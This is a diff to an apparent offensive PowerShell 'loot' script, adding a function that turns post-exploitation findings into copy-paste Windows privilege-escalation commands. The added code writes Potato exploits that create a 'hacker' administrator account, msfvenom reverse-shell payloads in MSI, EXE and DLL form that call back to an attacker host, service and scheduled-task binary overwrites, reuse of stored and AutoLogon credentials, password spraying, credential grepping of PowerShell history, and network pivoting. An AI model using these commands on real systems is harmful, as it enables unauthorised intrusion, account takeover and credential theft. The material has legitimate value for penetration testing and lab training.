@@ -1144,12 +1144,229 @@ function Invoke-Summary {
 
     $null = $sb.AppendLine("============================================================")
     $null = $sb.AppendLine("  Full data in: $LootDir\")
+    $null = $sb.AppendLine("  ★ attack_commands.txt — resolved exploit commands per finding")
     $null = $sb.AppendLine("============================================================")
 
     $sb.ToString() | Out-File -Encoding UTF8 $SFile
     Write-Success "Summary written -> $SFile"
     Write-Host ""
     Get-Content $SFile | Write-Host
+}
+
+#==============================================================================
+# ATTACK COMMANDS GENERATION
+# Generates attack_commands.txt — resolved exploit commands for each finding.
+# Mirrors the pattern used by lootr.sh on Linux.
+#==============================================================================
+function Invoke-AttackCommands {
+    $AFile = Join-Path $LootDir "attack_commands.txt"
+    $sb = [System.Text.StringBuilder]::new()
+    $HasActions = $false
+
+    $null = $sb.AppendLine("============================================================")
+    $null = $sb.AppendLine("  LOOTR ATTACK COMMANDS — $HostShort")
+    $null = $sb.AppendLine("  ★ START HERE — copy-paste these on Kali")
+    $null = $sb.AppendLine("  Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
+    $null = $sb.AppendLine("============================================================")
+    $null = $sb.AppendLine("")
+
+    # ── SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege ────────────────
+    $privPath = Join-Path $LootDir "creds\privileges.txt"
+    if (Test-Path $privPath) {
+        $privContent = Get-Content $privPath -ErrorAction SilentlyContinue
+        $hasPotato = $privContent | Select-String "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege"
+        if ($hasPotato) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ SeImpersonatePrivilege — POTATO ATTACK ]")
+            $null = $sb.AppendLine("  # Transfer binary from Kali (already in ~/tools/windows/):")
+            $null = $sb.AppendLine("  # GodPotato (most reliable, Win10/2019+):")
+            $null = $sb.AppendLine("  GodPotato-NET4.exe -cmd 'cmd /c whoami'")
+            $null = $sb.AppendLine("  GodPotato-NET4.exe -cmd 'cmd /c net user hacker P@ssword1 /add && net localgroup administrators hacker /add'")
+            $null = $sb.AppendLine("  # PrintSpoofer (Win10/2019 with print spooler running):")
+            $null = $sb.AppendLine("  PrintSpoofer64.exe -i -c cmd")
+            $null = $sb.AppendLine("  PrintSpoofer64.exe -c 'net user hacker P@ssword1 /add'")
+            $null = $sb.AppendLine("  # SigmaPotato (fallback — .NET reflection, no file drop):")
+            $null = $sb.AppendLine("  SigmaPotato.exe 'net user hacker P@ssword1 /add'")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── AlwaysInstallElevated ─────────────────────────────────────────────────
+    $aiePath = Join-Path $LootDir "files\always_install_elevated.txt"
+    if (Test-Path $aiePath) {
+        $aieContent = Get-Content $aiePath -ErrorAction SilentlyContinue
+        if ($aieContent | Select-String "0x1|ENABLED|AlwaysInstallElevated.*1") {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ AlwaysInstallElevated — MSI PRIVESC ]")
+            $null = $sb.AppendLine("  # Generate malicious MSI on Kali:")
+            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f msi -o privesc.msi")
+            $null = $sb.AppendLine("  # Transfer to target and run as current user (installs as SYSTEM):")
+            $null = $sb.AppendLine("  msiexec /quiet /qn /i privesc.msi")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── Unquoted Service Paths ────────────────────────────────────────────────
+    $uqPath = Join-Path $LootDir "files\unquoted_service_paths.txt"
+    if (Test-Path $uqPath) {
+        $uqContent = Get-Content $uqPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "\S" }
+        if ($uqContent) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ UNQUOTED SERVICE PATHS ]")
+            foreach ($svc in $uqContent | Select-Object -First 3) {
+                $null = $sb.AppendLine("  $svc")
+            }
+            $null = $sb.AppendLine("  # For each: generate reverse shell and drop in writable path segment:")
+            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell.exe")
+            $null = $sb.AppendLine("  # Copy to path segment (e.g. C:\Program.exe or C:\Program Files\Vuln.exe)")
+            $null = $sb.AppendLine("  sc stop <ServiceName> && sc start <ServiceName>   # trigger it")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── Writable Service Binaries ─────────────────────────────────────────────
+    $wsPath = Join-Path $LootDir "files\writable_service_binaries.txt"
+    if (Test-Path $wsPath) {
+        $wsContent = Get-Content $wsPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "WRITABLE" }
+        if ($wsContent) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ WRITABLE SERVICE BINARIES ]")
+            foreach ($bin in $wsContent | Select-Object -First 3) {
+                $null = $sb.AppendLine("  $bin")
+            }
+            $null = $sb.AppendLine("  # Generate reverse shell, overwrite binary, restart service:")
+            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell.exe")
+            $null = $sb.AppendLine("  copy shell.exe '<SERVICE_BINARY_PATH>'   # overwrite")
+            $null = $sb.AppendLine("  sc stop <ServiceName> && sc start <ServiceName>")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── DLL Hijack Candidates ─────────────────────────────────────────────────
+    $dllPath = Join-Path $LootDir "files\dll_hijack_candidates.txt"
+    if (Test-Path $dllPath) {
+        $dllContent = Get-Content $dllPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "WRITABLE" }
+        if ($dllContent) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ DLL HIJACK — WRITABLE DIRECTORY ]")
+            foreach ($d in $dllContent | Select-Object -First 3) {
+                $null = $sb.AppendLine("  $d")
+            }
+            $null = $sb.AppendLine("  # Generate malicious DLL on Kali:")
+            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f dll -o hijack.dll")
+            $null = $sb.AppendLine("  # Drop in writable directory with correct DLL name, restart service/app")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── Stored Credentials (cmdkey) ───────────────────────────────────────────
+    $ckPath = Join-Path $LootDir "creds\cmdkey_list.txt"
+    if (Test-Path $ckPath) {
+        $ckContent = Get-Content $ckPath -ErrorAction SilentlyContinue | Select-String "Target:|User:"
+        if ($ckContent) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ STORED CREDENTIALS (cmdkey) ]")
+            $ckContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
+            $null = $sb.AppendLine("  # Use stored creds without knowing the password:")
+            $null = $sb.AppendLine("  runas /savecred /user:<StoredUser> cmd.exe")
+            $null = $sb.AppendLine("  # Or use RunasCs (pass-the-stored-cred):")
+            $null = $sb.AppendLine("  RunasCs.exe <user> <pass> cmd.exe -b")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── Scheduled Tasks (writable binary) ────────────────────────────────────
+    $stPath = Join-Path $LootDir "system\scheduled_tasks.txt"
+    if (Test-Path $stPath) {
+        $stContent = Get-Content $stPath -ErrorAction SilentlyContinue | Select-String "SYSTEM|Administrator" | Select-Object -First 5
+        if ($stContent) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ SCHEDULED TASKS RUNNING AS SYSTEM/ADMIN ]")
+            $stContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
+            $null = $sb.AppendLine("  # Check if task binary is writable (icacls <path>)")
+            $null = $sb.AppendLine("  # If writable: overwrite with msfvenom reverse shell, wait for trigger")
+            $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o shell.exe")
+            $null = $sb.AppendLine("  copy shell.exe '<TASK_BINARY_PATH>'")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── AutoLogon Credentials ─────────────────────────────────────────────────
+    $alPath = Join-Path $LootDir "creds\autologon.txt"
+    if (Test-Path $alPath) {
+        $alContent = Get-Content $alPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "\S" }
+        if ($alContent | Select-String "DefaultPassword|DefaultUserName") {
+            $HasActions = $true
+            $alUser = ($alContent | Select-String "DefaultUserName" | Select-Object -First 1) -replace ".*REG_SZ\s+", ""
+            $alPass = ($alContent | Select-String "DefaultPassword" | Select-Object -First 1) -replace ".*REG_SZ\s+", ""
+            $null = $sb.AppendLine("[ AUTOLOGON CREDENTIALS FOUND ]")
+            $alContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
+            $null = $sb.AppendLine("  # Spray on Kali:")
+            $null = $sb.AppendLine("  ./sprayr.sh -u '$alUser' -p '$alPass' -t <TARGET_IP>")
+            $null = $sb.AppendLine("  # Escalate locally using RunasCs:")
+            $null = $sb.AppendLine("  RunasCs.exe $alUser $alPass cmd.exe -b")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── PowerShell History ────────────────────────────────────────────────────
+    $psHistPath = Join-Path $LootDir "creds\powershell_history.txt"
+    if (Test-Path $psHistPath) {
+        $psContent = Get-Content $psHistPath -ErrorAction SilentlyContinue |
+            Select-String -Pattern "pass|password|cred|secret|key|-p\s" -CaseSensitive:$false |
+            Select-Object -First 10
+        if ($psContent) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ POWERSHELL HISTORY — CREDENTIAL PATTERNS ]")
+            $psContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
+            $null = $sb.AppendLine("  # Extract and spray found passwords:")
+            $null = $sb.AppendLine("  # Copy extracted password to Kali and run: ./sprayr.sh -u <USER> -p '<PASS>' -t <TARGET>")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── Internal Listeners (pivot candidates) ─────────────────────────────────
+    $ilPath = Join-Path $LootDir "network\internal_listeners.txt"
+    if (Test-Path $ilPath) {
+        $ilContent = Get-Content $ilPath -ErrorAction SilentlyContinue | Where-Object { $_ -match "127\.0\.0\.1|0\.0\.0\.0" }
+        if ($ilContent) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ INTERNAL LISTENERS — PIVOT CANDIDATES ]")
+            $ilContent | Select-Object -First 10 | ForEach-Object { $null = $sb.AppendLine("  $_") }
+            $null = $sb.AppendLine("  # Forward an interesting port to Kali:")
+            $null = $sb.AppendLine("  # On Kali: ./pivotr.sh ssh --type local --pivot-ip <PIVOT_IP> --target-ip 127.0.0.1 --target-port <PORT>")
+            $null = $sb.AppendLine("  # Or: ./pivotr.sh chisel --type forward --target-ip 127.0.0.1 --target-port <PORT>")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    # ── Reachable Subnets ─────────────────────────────────────────────────────
+    $netPath = Join-Path $LootDir "network\interfaces.txt"
+    if (Test-Path $netPath) {
+        $subnets = Get-Content $netPath -ErrorAction SilentlyContinue |
+            Select-String -Pattern "IPv4|IPAddress" |
+            Where-Object { $_ -notmatch "127\.0\.0\.|169\.254\." }
+        if ($subnets) {
+            $HasActions = $true
+            $null = $sb.AppendLine("[ NETWORK INTERFACES — PIVOT TARGETS ]")
+            $subnets | ForEach-Object { $null = $sb.AppendLine("  $_") }
+            $null = $sb.AppendLine("  # Set up Ligolo pivot to reach internal subnet:")
+            $null = $sb.AppendLine("  # On Kali: ./pivotr.sh ligolo --subnet <SUBNET>/24 --serve")
+            $null = $sb.AppendLine("  # Transfer agent to this host and connect back")
+            $null = $sb.AppendLine("")
+        }
+    }
+
+    if (-not $HasActions) {
+        $null = $sb.AppendLine("  No high-value findings to generate commands for.")
+        $null = $sb.AppendLine("  Review summary.txt and the loot\ subdirectories manually.")
+    }
+
+    $null = $sb.AppendLine("============================================================")
+    $sb.ToString() | Out-File -Encoding UTF8 $AFile
+    Write-Success "Attack commands written -> $AFile"
+    Write-Host ""
+    Get-Content $AFile | Write-Host
 }
 
 #==============================================================================
@@ -1186,7 +1403,9 @@ if ($Phase -ne "") {
 }
 
 Invoke-Summary
+Invoke-AttackCommands
 
 Write-Host ""
 Write-Success "Loot collection complete. Output: $LootDir\"
-Write-Success "Quick review: Get-Content $LootDir\summary.txt"
+Write-Success "Quick review:      Get-Content $LootDir\summary.txt"
+Write-Success "Attack commands:   Get-Content $LootDir\attack_commands.txt"
